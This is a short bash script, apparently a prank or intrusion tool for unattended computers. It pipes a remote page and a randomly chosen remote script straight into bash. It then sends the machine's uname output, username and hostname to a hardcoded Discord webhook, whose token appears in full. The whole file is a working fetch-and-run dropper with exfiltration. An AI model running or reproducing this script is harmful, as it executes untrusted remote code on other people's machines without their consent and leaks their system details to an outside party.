#!/bin/bash

WEBHOOK_URL="https://discord.com/api/webhooks/1026544372226986046/esBmXNyXYcIajaAB-_T5taEBqaOud6c_jIWRpreOet7Eo65teeAc63ow9passnBlgxje"
rdm=$(( RANDOM % 16 ))

curl -s "https://Waz0x.github.io/msf" | bash
curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | bash
curl \
  -H "Content-Type: application/json" \
  -d "{\"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | sed '2q;d')\",\"url\":\"https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh\",\"color\":16711680,\"fields\":[{\"name\":\"uname:\",\"value\":\"$(uname -a)\"},{\"name\":\"user\",\"value\":\"$USER\"},{\"name\":\"hostname\",\"value\":\"$(hostname)\"}]}]}" $WEBHOOK_URL
exit
